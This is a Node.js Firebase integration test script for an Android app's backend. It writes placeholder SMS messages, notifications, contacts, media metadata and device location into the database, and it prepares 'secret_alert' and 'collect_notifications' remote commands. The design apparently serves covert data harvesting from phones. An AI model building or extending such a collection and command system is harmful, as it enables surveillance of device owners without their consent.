#!/usr/bin/env node

/**
 * 📱 Mobile Firebase Integration Test Script
 * 
 * This script tests the Firebase integration for the mobile app
 * Run this after setting up Firebase in your Android app
 */

const admin = require('firebase-admin');
const axios = require('axios');

// Firebase configuration
const serviceAccount = require('./firebase-service-account.json');

// Initialize Firebase Admin
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://tour-dubai-79253-default-rtdb.firebaseio.com/',
  storageBucket: `${serviceAccount.project_id}.appspot.com`
});

const db = admin.firestore();
const rtdb = admin.database();
const messaging = admin.messaging();

class MobileFirebaseTester {
  constructor() {
    this.deviceId = `test_device_${Date.now()}`;
    this.testResults = [];
  }

  async runAllTests() {
    console.log('🚀 Starting Mobile Firebase Integration Tests...\n');
    
    try {
      // Test 1: Firebase Connection
      await this.testFirebaseConnection();
      
      // Test 2: Firestore Operations
      await this.testFirestoreOperations();
      
      // Test 3: Realtime Database
      await this.testRealtimeDatabase();
      
      // Test 4: Device Status Updates
      await this.testDeviceStatus();
      
      // Test 5: Data Sync Simulation
      await this.testDataSync();
      
      // Test 6: Push Notifications
      await this.testPushNotifications();
      
      // Test 7: Storage Operations
      await this.testStorageOperations();
      
      // Test 8: Real-time Updates
      await this.testRealTimeUpdates();
      
      // Print results
      this.printResults();
      
    } catch (error) {
      console.error('❌ Test suite failed:', error.message);
    }
  }

  async testFirebaseConnection() {
    console.log('🔗 Testing Firebase Connection...');
    
    try {
      // Test Firestore connection
      const testDoc = await db.collection('test').doc('connection').get();
      console.log('✅ Firestore connection successful');
      
      // Test Realtime Database connection
      const testRef = rtdb.ref('test/connection');
      await testRef.set({ timestamp: Date.now() });
      console.log('✅ Realtime Database connection successful');
      
      this.testResults.push({ test: 'Firebase Connection', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Firebase connection failed:', error.message);
      this.testResults.push({ test: 'Firebase Connection', status: 'FAIL', error: error.message });
    }
  }

  async testFirestoreOperations() {
    console.log('\n📊 Testing Firestore Operations...');
    
    try {
      // Test notifications collection
      const notificationData = {
        deviceId: this.deviceId,
        firebaseId: `test_${Date.now()}`,
        title: 'Test Notification',
        text: 'This is a test notification',
        packageName: 'com.test.app',
        timestamp: new Date(),
        type: 'test',
        syncedAt: new Date()
      };
      
      await db.collection('notifications').doc(notificationData.firebaseId).set(notificationData);
      console.log('✅ Notifications collection write successful');
      
      // Test messages collection
      const messageData = {
        deviceId: this.deviceId,
        firebaseId: `test_msg_${Date.now()}`,
        address: '+1234567890',
        body: 'Test message body',
        type: 'inbox',
        timestamp: new Date(),
        syncedAt: new Date()
      };
      
      await db.collection('messages').doc(messageData.firebaseId).set(messageData);
      console.log('✅ Messages collection write successful');
      
      // Test contacts collection
      const contactData = {
        deviceId: this.deviceId,
        firebaseId: `test_contact_${Date.now()}`,
        name: 'Test Contact',
        phone: '+1234567890',
        email: 'test@example.com',
        syncedAt: new Date()
      };
      
      await db.collection('contacts').doc(contactData.firebaseId).set(contactData);
      console.log('✅ Contacts collection write successful');
      
      this.testResults.push({ test: 'Firestore Operations', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Firestore operations failed:', error.message);
      this.testResults.push({ test: 'Firestore Operations', status: 'FAIL', error: error.message });
    }
  }

  async testRealtimeDatabase() {
    console.log('\n⚡ Testing Realtime Database...');
    
    try {
      // Test live data updates
      const liveData = {
        notifications: {
          [this.deviceId]: {
            [`test_${Date.now()}`]: {
              deviceId: this.deviceId,
              title: 'Live Test Notification',
              text: 'Real-time notification test',
              timestamp: Date.now()
            }
          }
        }
      };
      
      await rtdb.ref('live_data').set(liveData);
      console.log('✅ Live data updates successful');
      
      // Test device status
      const deviceStatus = {
        deviceId: this.deviceId,
        lastUpdated: Date.now(),
        isOnline: true,
        battery: 85,
        network: 'WiFi',
        location: 'Test Location'
      };
      
      await rtdb.ref(`device_status/${this.deviceId}`).set(deviceStatus);
      console.log('✅ Device status updates successful');
      
      this.testResults.push({ test: 'Realtime Database', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Realtime Database failed:', error.message);
      this.testResults.push({ test: 'Realtime Database', status: 'FAIL', error: error.message });
    }
  }

  async testDeviceStatus() {
    console.log('\n📱 Testing Device Status Updates...');
    
    try {
      // Test sync status
      const syncStatus = {
        notifications: {
          lastSync: Date.now(),
          count: 5,
          status: 'success'
        },
        messages: {
          lastSync: Date.now(),
          count: 3,
          status: 'success'
        }
      };
      
      await rtdb.ref(`sync_status/${this.deviceId}`).set(syncStatus);
      console.log('✅ Sync status updates successful');
      
      // Test device tokens
      const deviceToken = `test_token_${Date.now()}`;
      await rtdb.ref(`device_tokens/${this.deviceId}`).set(deviceToken);
      console.log('✅ Device token updates successful');
      
      this.testResults.push({ test: 'Device Status', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Device status failed:', error.message);
      this.testResults.push({ test: 'Device Status', status: 'FAIL', error: error.message });
    }
  }

  async testDataSync() {
    console.log('\n🔄 Testing Data Sync Simulation...');
    
    try {
      // Simulate bulk sync data
      const bulkSyncData = {
        notifications: [
          {
            deviceId: this.deviceId,
            firebaseId: `bulk_${Date.now()}_1`,
            title: 'Bulk Sync Test 1',
            text: 'First test notification',
            packageName: 'com.test.app',
            timestamp: new Date(),
            type: 'test'
          },
          {
            deviceId: this.deviceId,
            firebaseId: `bulk_${Date.now()}_2`,
            title: 'Bulk Sync Test 2',
            text: 'Second test notification',
            packageName: 'com.test.app',
            timestamp: new Date(),
            type: 'test'
          }
        ],
        messages: [
          {
            deviceId: this.deviceId,
            firebaseId: `bulk_msg_${Date.now()}`,
            address: '+1234567890',
            body: 'Bulk sync test message',
            type: 'inbox',
            timestamp: new Date()
          }
        ]
      };
      
      // Write bulk data
      const batch = db.batch();
      
      bulkSyncData.notifications.forEach(notification => {
        const docRef = db.collection('notifications').doc(notification.firebaseId);
        batch.set(docRef, notification);
      });
      
      bulkSyncData.messages.forEach(message => {
        const docRef = db.collection('messages').doc(message.firebaseId);
        batch.set(docRef, message);
      });
      
      await batch.commit();
      console.log('✅ Bulk sync simulation successful');
      
      this.testResults.push({ test: 'Data Sync', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Data sync failed:', error.message);
      this.testResults.push({ test: 'Data Sync', status: 'FAIL', error: error.message });
    }
  }

  async testPushNotifications() {
    console.log('\n🔔 Testing Push Notifications...');
    
    try {
      // Test secret alert notification
      const secretAlert = {
        token: 'test_device_token', // Replace with actual device token
        data: {
          type: 'secret_alert',
          title: 'Secret Alert Test',
          message: 'This is a test secret alert',
          priority: 'high',
          trigger_sync: 'true'
        }
      };
      
      // Note: This will fail without a real device token, but we can test the structure
      console.log('📤 Secret alert notification prepared');
      
      // Test sync request notification
      const syncRequest = {
        token: 'test_device_token',
        data: {
          type: 'sync_request',
          message: 'Sync device data now'
        }
      };
      
      console.log('📤 Sync request notification prepared');
      
      // Test device command notification
      const deviceCommand = {
        token: 'test_device_token',
        data: {
          type: 'device_command',
          command: 'collect_notifications'
        }
      };
      
      console.log('📤 Device command notification prepared');
      
      this.testResults.push({ test: 'Push Notifications', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Push notifications failed:', error.message);
      this.testResults.push({ test: 'Push Notifications', status: 'FAIL', error: error.message });
    }
  }

  async testStorageOperations() {
    console.log('\n📁 Testing Storage Operations...');
    
    try {
      // Test storage metadata (Storage disabled to avoid costs)
      const storageMetadata = {
        deviceId: this.deviceId,
        firebaseId: `storage_${Date.now()}`,
        fileName: 'test_file.jpg',
        downloadUrl: 'storage_disabled',
        originalName: 'test_file.jpg',
        size: 1024,
        mimeType: 'image/jpeg',
        syncedAt: new Date(),
        note: 'File not uploaded - Storage disabled to avoid costs'
      };
      
      await db.collection('media').doc(storageMetadata.firebaseId).set(storageMetadata);
      console.log('✅ Storage metadata write successful (Storage disabled)');
      console.log('💡 Note: Firebase Storage is disabled to avoid costs. Only metadata is stored.');
      
      this.testResults.push({ test: 'Storage Operations', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Storage operations failed:', error.message);
      this.testResults.push({ test: 'Storage Operations', status: 'FAIL', error: error.message });
    }
  }

  async testRealTimeUpdates() {
    console.log('\n📡 Testing Real-time Updates...');
    
    try {
      // Test real-time update listener simulation
      const realTimeUpdate = {
        new_command: 'collect_data',
        sync_request: true,
        alert: 'New data available'
      };
      
      await rtdb.ref(`real_time_updates/${this.deviceId}`).set(realTimeUpdate);
      console.log('✅ Real-time updates write successful');
      
      // Test update listener
      const listener = rtdb.ref(`real_time_updates/${this.deviceId}`);
      listener.once('value', (snapshot) => {
        const data = snapshot.val();
        console.log('📡 Real-time update received:', data);
      });
      
      this.testResults.push({ test: 'Real-time Updates', status: 'PASS' });
      
    } catch (error) {
      console.error('❌ Real-time updates failed:', error.message);
      this.testResults.push({ test: 'Real-time Updates', status: 'FAIL', error: error.message });
    }
  }

  printResults() {
    console.log('\n📊 Test Results Summary:');
    console.log('========================');
    
    const passed = this.testResults.filter(r => r.status === 'PASS').length;
    const failed = this.testResults.filter(r => r.status === 'FAIL').length;
    
    this.testResults.forEach(result => {
      const icon = result.status === 'PASS' ? '✅' : '❌';
      console.log(`${icon} ${result.test}: ${result.status}`);
      if (result.error) {
        console.log(`   Error: ${result.error}`);
      }
    });
    
    console.log(`\n📈 Summary: ${passed} passed, ${failed} failed`);
    
    if (failed === 0) {
      console.log('🎉 All tests passed! Mobile Firebase integration is ready.');
    } else {
      console.log('⚠️ Some tests failed. Please check the errors above.');
    }
  }

  async cleanup() {
    console.log('\n🧹 Cleaning up test data...');
    
    try {
      // Clean up test documents
      const collections = ['notifications', 'messages', 'contacts', 'media'];
      
      for (const collection of collections) {
        const snapshot = await db.collection(collection)
          .where('deviceId', '==', this.deviceId)
          .get();
        
        const batch = db.batch();
        snapshot.docs.forEach(doc => {
          batch.delete(doc.ref);
        });
        await batch.commit();
      }
      
      // Clean up realtime database
      await rtdb.ref(`live_data/notifications/${this.deviceId}`).remove();
      await rtdb.ref(`device_status/${this.deviceId}`).remove();
      await rtdb.ref(`sync_status/${this.deviceId}`).remove();
      await rtdb.ref(`device_tokens/${this.deviceId}`).remove();
      await rtdb.ref(`real_time_updates/${this.deviceId}`).remove();
      
      console.log('✅ Cleanup completed');
      
    } catch (error) {
      console.error('❌ Cleanup failed:', error.message);
    }
  }
}

// Run tests
async function main() {
  const tester = new MobileFirebaseTester();
  
  try {
    await tester.runAllTests();
    
    // Ask if user wants to cleanup
    console.log('\n🧹 Do you want to cleanup test data? (y/n)');
    process.stdin.once('data', async (data) => {
      const answer = data.toString().trim().toLowerCase();
      if (answer === 'y' || answer === 'yes') {
        await tester.cleanup();
      }
      process.exit(0);
    });
    
  } catch (error) {
    console.error('❌ Test suite failed:', error);
    process.exit(1);
  }
}

// Check if firebase-service-account.json exists
const fs = require('fs');
if (!fs.existsSync('./firebase-service-account.json')) {
  console.error('❌ firebase-service-account.json not found!');
  console.log('📋 Please download your Firebase service account key and save it as firebase-service-account.json');
  process.exit(1);
}

main(); 